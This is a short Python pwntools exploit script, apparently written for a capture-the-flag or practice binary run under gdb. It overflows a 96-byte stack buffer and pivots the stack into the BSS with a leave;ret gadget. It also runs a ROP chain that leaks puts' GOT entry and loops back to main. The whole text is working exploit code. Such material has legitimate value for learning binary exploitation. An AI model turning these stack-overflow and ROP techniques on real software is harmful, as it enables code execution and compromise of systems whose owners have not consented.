from pwn import *

e = ELF("./app_patched")
p = gdb.debug("./app_patched")

# Gadgets from your list
pop_rdi_ret = p64(0x401283)
leave_ret   = p64(0x4011fa)
ret         = p64(0x40101a)

# Choose a fixed, static address inside the binary's writable BSS area
# e.bss() will evaluate to a static address like 0x4040X0
new_stack = e.bss() + 0x200 

# Build our ROP chain first
rop_chain = b""
rop_chain += ret                # 16-byte alignment spacer for puts
rop_chain += pop_rdi_ret
rop_chain += p64(e.got["puts"])
rop_chain += p64(e.plt["puts"])
rop_chain += p64(e.symbols["main"]) # Clean loop back to start over

# Construct the payload:
# 1. Place the ROP chain right at the beginning of local_68 buffer
payload = rop_chain

# 2. Pad up to 96 bytes (the size of local_68)
payload = payload.ljust(96, b'A')

# 3. Overwrite saved RBP with the address of our new stack frame.
# Since our ROP chain is at the start of the buffer, we want RBP to point 
# right below it. Let's point it to our static new_stack address.
payload += p64(new_stack)

# 4. Overwrite the saved RIP with a leave; ret gadget.
# This will copy our new_stack address into RSP, cleanly escaping the broken page!
payload += leave_ret

p.sendline(payload)
p.interactive()
